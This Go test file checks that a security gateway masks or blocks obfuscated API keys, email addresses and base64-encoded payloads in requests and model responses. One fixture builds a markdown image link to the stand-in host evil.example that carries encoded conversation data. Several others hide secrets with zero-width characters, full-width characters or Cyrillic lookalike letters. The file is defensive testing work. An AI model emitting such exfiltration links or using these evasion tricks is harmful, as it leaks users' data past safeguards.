package detection

import (
	"context"
	"encoding/base64"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/bastio-ai/bastio/internal/security"
	"github.com/bastio-ai/bastio/internal/security/normalize"
)

// Synthetic credentials only. Built from parts so secret scanners do not
// flag this file; none of these are real keys.
func syntheticOpenAIKey() string {
	return strings.Join([]string{"sk", "proj", "Ab3dEf6hIj9kLm2nOp5q" + "Rs8tUv1wXy4zAb7cDe0fGh3iJk6l"}, "-")
}

func syntheticEmail() string { return "jane.q" + "doe" + "@" + "example" + ".com" }

// fullWidthASCII maps printable ASCII to the full-width block (NFKC folds
// it back), the obfuscation a detector sees through but a regex does not.
func fullWidthASCII(s string) string {
	var b strings.Builder
	for _, r := range s {
		if r > 0x20 && r < 0x7f {
			b.WriteRune(r + 0xFEE0)
			continue
		}
		b.WriteRune(r)
	}
	return b.String()
}

// stillCarries reports whether text holds secret in its raw form or in
// any canonical form the engine compares against.
func stillCarries(text, secret string) bool {
	if strings.Contains(text, secret) {
		return true
	}
	if strings.Contains(security.Canonicalize(text).Canonical, secret) {
		return true
	}
	n := normalize.Normalize(text, normalize.Options{Unicode: true}).Normalized
	return strings.Contains(security.Canonicalize(n).Canonical, secret)
}

func obfuscatedKeys() map[string]string {
	key := syntheticOpenAIKey()
	o := strings.IndexByte(key, 'O')
	return map[string]string{
		"zero_width_space":  key[:14] + "\u200b" + key[14:],
		"zero_width_joiner": key[:9] + "\u200d" + key[9:30] + "\u200d" + key[30:],
		"full_width_char":   key[:20] + fullWidthASCII(key[20:21]) + key[21:],
		"full_width_key":    fullWidthASCII(key),
		"cyrillic_o":        key[:o] + "О" + key[o+1:],
	}
}

func responseScan(e *security.Engine, p security.Profile, text string) *security.ScanResult {
	_, out := security.StepsFromLegacyProfile(p)
	return e.Scan(context.Background(), &security.ScanRequest{
		Content:      text,
		PIIAction:    security.ActionMask,
		Steps:        out,
		Role:         security.RoleAssistant,
		Canonicalize: p.CanonicalizeEnabled,
		Suppressions: p.Suppressions,
		Normalize:    normalize.Options{Unicode: p.NormalizeUnicode, Decode: p.NormalizeDecode},
	})
}

// responseDelivered mirrors the gateway response contract: a block (or an
// unapplied rewrite, which the gateway turns into a block) delivers
// nothing; otherwise the sanitized content is delivered.
func responseDelivered(scan *security.ScanResult, text string) (string, bool) {
	if scan.ShouldBlock || len(scan.UnappliedRewrites) > 0 {
		return "", false
	}
	if (scan.Action.IsMaskLike() || scan.Action == security.ActionTokenize) && scan.SanitizedContent != "" {
		return scan.SanitizedContent, true
	}
	return text, true
}

func TestRewriteVerify_RequestSecretsObfuscated(t *testing.T) {
	e := benchEngine()
	key := syntheticOpenAIKey()
	for name, obf := range obfuscatedKeys() {
		t.Run(name, func(t *testing.T) {
			text := "Use this for the deploy script: " + obf + " thanks"
			out, scan, ok := gatewayInput(context.Background(), e, security.DefaultProfile(), text)
			// Blocking would also be safe; these obfuscations are all
			// remappable, so the fix must mask rather than block.
			if scan.ShouldBlock || !ok {
				t.Fatalf("expected remap, got block=%v ok=%v acts=%v", scan.ShouldBlock, ok, scan.DetectorActions)
			}
			if stillCarries(out, key) {
				t.Fatalf("outbound body still carries the key: %q", out)
			}
			if scan.DetectorActions["secrets"] != security.ActionMask {
				t.Fatalf("secrets action = %q, want mask", scan.DetectorActions["secrets"])
			}
		})
	}
}

func TestRewriteVerify_ResponseSecretsObfuscated(t *testing.T) {
	e := benchEngine()
	key := syntheticOpenAIKey()
	unicodeOff := security.DefaultProfile()
	unicodeOff.NormalizeUnicode = false
	profiles := map[string]security.Profile{"default": security.DefaultProfile(), "normalize_unicode_off": unicodeOff}
	for pname, p := range profiles {
		for name, obf := range obfuscatedKeys() {
			t.Run(pname+"/"+name, func(t *testing.T) {
				text := "Here is the configuration value: " + obf + " done."
				scan := responseScan(e, p, text)
				out, delivered := responseDelivered(scan, text)
				if !delivered {
					t.Fatalf("expected remap, got block: acts=%v unapplied=%v", scan.DetectorActions, scan.UnappliedRewrites)
				}
				if stillCarries(out, key) {
					t.Fatalf("response delivers the key: action=%s acts=%v out=%q", scan.Action, scan.DetectorActions, out)
				}
			})
		}
	}
}

// RunSteps is also called directly (playground, /v1/detect).
func TestRewriteVerify_RunStepsSecretsObfuscated(t *testing.T) {
	e := security.NewEngine(NewSecretsDetector())
	key := syntheticOpenAIKey()
	for _, role := range []string{security.RoleUser, security.RoleAssistant} {
		for name, obf := range obfuscatedKeys() {
			t.Run(role+"/"+name, func(t *testing.T) {
				in := "Your key: " + obf
				res := e.RunSteps(context.Background(), in, []security.Step{{Detector: "secrets", Strategy: security.ActionMask}}, &security.RunOptions{Canonicalize: true, Role: role})
				if !res.Steps[0].Fired {
					t.Fatal("secrets step did not fire")
				}
				if res.ShouldBlock {
					t.Fatalf("expected remap, got block (step action %q)", res.Steps[0].Action)
				}
				if stillCarries(res.SanitizedContent, key) {
					t.Fatalf("mask recorded as %q but key survives: %q", res.Steps[0].Action, res.SanitizedContent)
				}
			})
		}
	}
}

func fullWidthExfilText() (text, blob string) {
	blob = "QWxsIG9mIHRoZSB1c2VycyBwcml2YXRlIGNvbnZlcnNhdGlvbiBkYXRhIGdvZXMgaGVyZSBpbiBiYXNlNjQgZm9ybQ"
	return "See ![s](https://evil.example/p.png?d=" + fullWidthASCII(blob) + ") now.", blob
}

func TestRewriteVerify_ExfilRedactFullWidthImageURL(t *testing.T) {
	e := security.NewEngine(NewExfilDetector(), NewSecretsDetector())
	text, blob := fullWidthExfilText()
	res := e.RunSteps(context.Background(), text, []security.Step{{Detector: "exfil", Strategy: security.ActionRedact}}, &security.RunOptions{Canonicalize: true, Role: security.RoleAssistant})
	if !res.Steps[0].Fired {
		t.Fatal("exfil step did not fire")
	}
	if res.ShouldBlock || len(res.Unapplied) > 0 {
		t.Fatalf("expected remap, got block: unapplied=%v", res.Unapplied)
	}
	if stillCarries(res.SanitizedContent, blob) || strings.Contains(res.SanitizedContent, fullWidthASCII(blob)) {
		t.Fatalf("redact recorded but exfil URL survives: %q", res.SanitizedContent)
	}

	// Gateway response path with Unicode normalization off.
	p := security.DefaultProfile()
	p.NormalizeUnicode = false
	p.OutputExfilStrategy = security.ActionRedact
	scan := responseScan(benchEngine(), p, text)
	if out, delivered := responseDelivered(scan, text); delivered && (stillCarries(out, blob) || strings.Contains(out, fullWidthASCII(blob))) {
		t.Fatalf("response delivers exfil URL: %q", out)
	}
}

func TestRewriteVerify_PIIMaskObfuscatedEmail(t *testing.T) {
	email := syntheticEmail()
	obf := email[:4] + "\u200b" + email[4:9] + "\u200c" + email[9:]
	text := "Contact me at " + obf + " tomorrow."

	out, scan, ok := gatewayInput(context.Background(), benchEngine(), security.DefaultProfile(), text)
	if ok && !scan.ShouldBlock && stillCarries(out, email) {
		t.Fatalf("request forwards the email: %q", out)
	}

	p := security.DefaultProfile()
	p.NormalizeUnicode = false
	rs := responseScan(benchEngine(), p, text)
	if out, delivered := responseDelivered(rs, text); delivered && stillCarries(out, email) {
		t.Fatalf("response delivers the email: %q", out)
	}

	res := security.NewEngine(NewPIIDetector()).RunSteps(context.Background(), text, []security.Step{{Detector: "pii", Strategy: security.ActionMask}}, &security.RunOptions{Canonicalize: true})
	if !res.ShouldBlock && stillCarries(res.SanitizedContent, email) {
		t.Fatalf("RunSteps mask leaves the email: %q", res.SanitizedContent)
	}
}

func TestRewriteVerify_LogOnlyObfuscatedSecretUnchanged(t *testing.T) {
	obf := obfuscatedKeys()["zero_width_space"]
	text := "Use this for the deploy script: " + obf + " thanks"
	out, scan, ok := gatewayInput(context.Background(), benchEngine(), logOnlyProfile(), text)
	if !ok || scan.ShouldBlock {
		t.Fatalf("log_only profile blocked: ok=%v block=%v", ok, scan.ShouldBlock)
	}
	if out != text {
		t.Fatalf("log_only profile rewrote the text: %q", out)
	}
	if scan.DetectorActions["secrets"] != security.ActionLogOnly {
		t.Fatalf("secrets action = %q, want log_only", scan.DetectorActions["secrets"])
	}
	found := false
	for _, f := range scan.Findings {
		if f.DetectorName == "secrets" {
			found = true
		}
	}
	if !found {
		t.Fatal("secret finding not recorded")
	}

	// Monitor-style warn strategy: same contract.
	p := logOnlyProfile()
	p.SecretsStrategy = security.ActionWarn
	out, scan, ok = gatewayInput(context.Background(), benchEngine(), p, text)
	if !ok || scan.ShouldBlock || out != text {
		t.Fatalf("warn profile changed behaviour: ok=%v block=%v changed=%v", ok, scan.ShouldBlock, out != text)
	}

	// Response side, log_only output pipeline, Unicode normalization off.
	p = logOnlyProfile()
	p.NormalizeUnicode = false
	rs := responseScan(benchEngine(), p, text)
	if rs.ShouldBlock || len(rs.UnappliedRewrites) > 0 {
		t.Fatalf("log_only response blocked: %+v", rs.DetectorActions)
	}
}

func TestRewriteVerify_PlainSecretStillMasked(t *testing.T) {
	key := syntheticOpenAIKey()
	text := "Use this for the deploy script: " + key + " thanks"
	out, scan, ok := gatewayInput(context.Background(), benchEngine(), security.DefaultProfile(), text)
	if !ok || scan.ShouldBlock {
		t.Fatalf("plain secret blocked: ok=%v block=%v", ok, scan.ShouldBlock)
	}
	if stillCarries(out, key) || !strings.Contains(out, "[REDACTED_") {
		t.Fatalf("plain secret not masked: %q", out)
	}
	if scan.DetectorActions["secrets"] != security.ActionMask {
		t.Fatalf("secrets action = %q, want mask", scan.DetectorActions["secrets"])
	}
	rs := responseScan(benchEngine(), security.DefaultProfile(), text)
	if rs.ShouldBlock || len(rs.UnappliedRewrites) > 0 || stillCarries(rs.SanitizedContent, key) {
		t.Fatalf("plain response secret: block=%v unapplied=%v out=%q", rs.ShouldBlock, rs.UnappliedRewrites, rs.SanitizedContent)
	}
}

func TestRewriteVerify_TokenizeKeepsTokenMap(t *testing.T) {
	email := syntheticEmail()
	p := security.DefaultProfile()
	p.PIIAction = security.ActionTokenize
	text := "Contact me at " + email + " tomorrow."
	in, _ := security.StepsFromLegacyProfile(p)
	e := benchEngine()
	scan := e.Scan(context.Background(), &security.ScanRequest{Content: text, Steps: in, Role: security.RoleUser, Canonicalize: true, SkipSanitization: true})
	tm := security.NewTokenMap(security.TokenStyleAngle)
	out, ok := e.SanitizeDecisions(text, in, scan.DetectorActions, tm, false)
	if !ok || scan.ShouldBlock || strings.Contains(out, email) || tm.Size() != 1 {
		t.Fatalf("tokenize: ok=%v block=%v size=%d out=%q", ok, scan.ShouldBlock, tm.Size(), out)
	}
	if restored, _ := tm.Restore(out); restored != text {
		t.Fatalf("restore = %q, want %q", restored, text)
	}

	// A split the tokenizer partially matches must not forward the full
	// value either.
	partial := "Contact me at " + email[:4] + "\u200b" + email[4:] + " tomorrow."
	if out, scan1, ok := gatewayInput(context.Background(), e, p, partial); ok && !scan1.ShouldBlock && stillCarries(out, email) {
		t.Fatalf("tokenize forwards obfuscated email: %q", out)
	}

	// Obfuscated inside the domain: the tokenizer matches nothing. The
	// located span is masked one-way (a placeholder for the canonical form
	// would restore text the user never sent) and recorded as mask.
	at := strings.IndexByte(email, '@')
	obf := "Contact me at " + email[:at+4] + "\u200b" + email[at+4:] + " tomorrow."
	out, scan2, ok := gatewayInput(context.Background(), e, p, obf)
	if !ok || scan2.ShouldBlock || stillCarries(out, email) || strings.Contains(out, "<PII_") {
		t.Fatalf("tokenize fallback: ok=%v block=%v out=%q", ok, scan2.ShouldBlock, out)
	}
	if scan2.DetectorActions["pii"] != security.ActionMask {
		t.Fatalf("pii action = %q, want mask (fallback)", scan2.DetectorActions["pii"])
	}
	fw := "mail " + email[:at] + "\uff20" + email[at+1:]
	res := security.NewEngine(NewPIIDetector()).RunSteps(context.Background(), fw, []security.Step{{Detector: "pii", Strategy: security.ActionTokenize}}, &security.RunOptions{Canonicalize: true})
	if res.ShouldBlock || res.Steps[0].Action != security.ActionMask || res.Steps[0].Reason == "" || stillCarries(res.SanitizedContent, email) {
		t.Fatalf("RunSteps tokenize fallback: block=%v step=%+v out=%q", res.ShouldBlock, res.Steps[0], res.SanitizedContent)
	}
	if res.TokenMap != nil && res.TokenMap.Size() != 0 {
		t.Fatal("fallback mask must not add a restorable token")
	}

	// Response restore still works on a remapped (masked) response.
	resp := "Sure, " + email[:4] + "\u200b" + email[4:] + " was noted for " + out
	rs := responseScan(e, security.DefaultProfile(), resp)
	if txt, delivered := responseDelivered(rs, resp); !delivered || stillCarries(txt, email) {
		t.Fatalf("response mask: delivered=%v out=%q", delivered, txt)
	}
}

// countingDetector counts Detect calls and forwards the sanitizer
// interfaces of the wrapped detector.
type countingDetector struct {
	inner *SecretsDetector
	calls *atomic.Int32
}

func (c countingDetector) Name() string { return c.inner.Name() }
func (c countingDetector) Detect(ctx context.Context, s string) ([]security.Finding, error) {
	c.calls.Add(1)
	return c.inner.Detect(ctx, s)
}
func (c countingDetector) Mask(s string) string { return c.inner.Mask(s) }
func (c countingDetector) TokenizeInto(s string, tm *security.TokenMap) string {
	return c.inner.TokenizeInto(s, tm)
}
func (c countingDetector) RewriteSpans(ctx context.Context, s string) []security.RewriteSpan {
	return c.inner.RewriteSpans(ctx, s)
}

func TestRewriteVerify_DetectCallBudget(t *testing.T) {
	steps := []security.Step{{Detector: "secrets", Strategy: security.ActionMask}}
	key := syntheticOpenAIKey()
	cases := []struct {
		name     string
		text     string
		strategy security.Action
		max      int32
		min      int32
	}{
		{"clean", benchPrompt(), security.ActionMask, 1, 1},
		{"clean_non_ascii", "Café notes — résumé attached\u00a0today", security.ActionMask, 1, 1},
		{"log_only_obfuscated", "k " + obfuscatedKeys()["zero_width_space"], security.ActionLogOnly, 1, 1},
		{"plain_secret", "k " + key, security.ActionMask, 1, 1},
		{"obfuscated_secret", "k " + obfuscatedKeys()["zero_width_space"], security.ActionMask, 3, 2},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			var n atomic.Int32
			e := security.NewEngine(countingDetector{inner: NewSecretsDetector(), calls: &n})
			s := []security.Step{{Detector: steps[0].Detector, Strategy: c.strategy}}
			e.RunSteps(context.Background(), c.text, s, &security.RunOptions{Canonicalize: true})
			if got := n.Load(); got < c.min || got > c.max {
				t.Fatalf("Detect calls = %d, want [%d,%d]", got, c.min, c.max)
			}
		})
	}
}

// A value only present in the decoded suffix of the canonical view cannot
// be remapped onto the original; the response must still not be delivered
// with it (finishEncodedScan blocked this before; RunSteps now does too).
func TestRewriteVerify_EncodedPIIFailsClosed(t *testing.T) {
	email := syntheticEmail()
	text := "Caf\u00e9 note: " + base64.StdEncoding.EncodeToString([]byte("please write to "+email+" today")) + " end"
	for _, uni := range []bool{true, false} {
		p := security.DefaultProfile()
		p.NormalizeUnicode = uni
		scan := responseScan(benchEngine(), p, text)
		if out, delivered := responseDelivered(scan, text); delivered && strings.Contains(out, base64.StdEncoding.EncodeToString([]byte("please write to "+email+" today"))) {
			t.Fatalf("unicode=%v: encoded email delivered: acts=%v out=%q", uni, scan.DetectorActions, out)
		}
	}
}

// Ordinary encoded traffic (JWT-shaped tokens, data URIs, base64 JSON) in
// text that canonicalization changes must not start blocking under mask.
func TestRewriteVerify_OrdinaryEncodedTrafficUnaffected(t *testing.T) {
	jwtLike := strings.Join([]string{
		base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`)),
		base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"order-1234","scope":"read"}`)),
		"c2lnbmF0dXJlLWJ5dGVzLW5vdC1yZWFs",
	}, ".")
	png := "data:image/png;base64," + base64.StdEncoding.EncodeToString([]byte("\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x10"))
	jsonBlob := base64.StdEncoding.EncodeToString([]byte(`{"items":[{"sku":"lamp-01","qty":2}]}`))
	for name, payload := range map[string]string{"jwt": jwtLike, "data_uri": png, "base64_json": jsonBlob} {
		t.Run(name, func(t *testing.T) {
			text := "R\u00e9sum\u00e9\u00a0attached \u2014 token " + payload + " thanks"
			out, scan, ok := gatewayInput(context.Background(), benchEngine(), security.DefaultProfile(), text)
			if !ok || scan.ShouldBlock || scan.RewriteUnavailable {
				t.Fatalf("request blocked: ok=%v acts=%v", ok, scan.DetectorActions)
			}
			// A JWT is itself a secrets pattern: masked in place, which is
			// the configured rewrite working, not a block.
			if want := map[string]string{"jwt": "[REDACTED_JWT]"}[name]; want != "" {
				if !strings.Contains(out, want) || strings.Contains(out, payload) {
					t.Fatalf("jwt not masked in place: %q", out)
				}
			} else if !strings.Contains(out, payload) {
				t.Fatalf("encoded payload changed: %q", out)
			}
			rs := responseScan(benchEngine(), security.DefaultProfile(), text)
			if _, delivered := responseDelivered(rs, text); !delivered {
				t.Fatalf("response withheld: acts=%v", rs.DetectorActions)
			}
		})
	}
}

// Values found only inside an encoded payload: the payload is replaced
// whole (request continues); request and response, PII and secrets.
func TestRewriteVerify_EncodedPayloadMaskedWhole(t *testing.T) {
	email := syntheticEmail()
	b64json := base64.StdEncoding.EncodeToString([]byte(`{"user":"jane","email":"` + email + `"}`))
	pct := strings.ReplaceAll(email, "@", "%40") + "%20%20%20%20%20"
	keyBlob := base64.StdEncoding.EncodeToString([]byte("deploy with " + syntheticOpenAIKey() + " please"))
	cases := []struct{ name, det, text, payload, placeholder string }{
		{"base64_json_email", "pii", "tool result: " + b64json, b64json, "[REDACTED_ENCODED_PII]"},
		{"percent_email", "pii", "q=" + pct, pct, "[REDACTED_ENCODED_PII]"},
		{"base64_secret", "secrets", "config: " + keyBlob, keyBlob, "[REDACTED_ENCODED_SECRETS]"},
	}
	e := security.NewEngine(NewPIIDetector(), NewSecretsDetector())
	for _, c := range cases {
		for _, role := range []string{security.RoleUser, security.RoleAssistant} {
			t.Run(c.name+"/"+role, func(t *testing.T) {
				res := e.RunSteps(context.Background(), c.text, []security.Step{{Detector: c.det, Strategy: security.ActionMask}}, &security.RunOptions{Canonicalize: true, Role: role})
				if res.ShouldBlock || res.Steps[0].Action != security.ActionMask || res.Steps[0].Reason == "" {
					t.Fatalf("block=%v step=%+v", res.ShouldBlock, res.Steps[0])
				}
				if strings.Contains(res.SanitizedContent, c.payload) || !strings.Contains(res.SanitizedContent, c.placeholder) {
					t.Fatalf("payload not replaced: %q", res.SanitizedContent)
				}
			})
		}
	}
}

// decodedOnlyDetector fires whenever the scanned text carries a decoded
// payload suffix, so its finding can never be located in the original:
// the unlocatable-payload fallback.
type decodedOnlyDetector struct{ name string }

func (d decodedOnlyDetector) Name() string { return d.name }
func (d decodedOnlyDetector) Detect(_ context.Context, s string) ([]security.Finding, error) {
	if !strings.Contains(s, "[DECODED:") {
		return nil, nil
	}
	return []security.Finding{{DetectorName: d.name, ThreatType: security.ThreatPII, Score: 0.9, Confidence: 0.9, MatchedPattern: "x"}}, nil
}
func (d decodedOnlyDetector) Mask(s string) string                               { return s }
func (d decodedOnlyDetector) TokenizeInto(s string, _ *security.TokenMap) string { return s }
func (d decodedOnlyDetector) RewriteSpans(context.Context, string) []security.RewriteSpan {
	return nil
}

func TestRewriteVerify_UnlocatableEncodedPayload(t *testing.T) {
	text := "data " + base64.StdEncoding.EncodeToString([]byte("an ordinary message that decodes cleanly"))
	cases := []struct {
		det, role string
		block     bool
	}{
		{"pii", security.RoleUser, false},
		{"pii", security.RoleAssistant, false},
		{"exfil", security.RoleUser, false},
		{"exfil", security.RoleAssistant, true},
		{"secrets", security.RoleUser, true},
		{"secrets", security.RoleAssistant, true},
	}
	for _, c := range cases {
		t.Run(c.det+"/"+c.role, func(t *testing.T) {
			e := security.NewEngine(decodedOnlyDetector{c.det})
			res := e.RunSteps(context.Background(), text, []security.Step{{Detector: c.det, Strategy: security.ActionMask}}, &security.RunOptions{Canonicalize: true, Role: c.role})
			st := res.Steps[0]
			if c.block {
				if !res.ShouldBlock || !res.RewriteUnavailable || st.Action != security.ActionBlock || !st.RewriteUnverified || !strings.Contains(st.Reason, "could not be masked") {
					t.Fatalf("want withheld: block=%v step=%+v", res.ShouldBlock, st)
				}
				return
			}
			if res.ShouldBlock || st.Action != security.ActionWarn || res.SanitizedContent != text || !strings.Contains(st.Reason, "forwarded unmasked") {
				t.Fatalf("want forwarded as warn: block=%v step=%+v", res.ShouldBlock, st)
			}
		})
	}
}
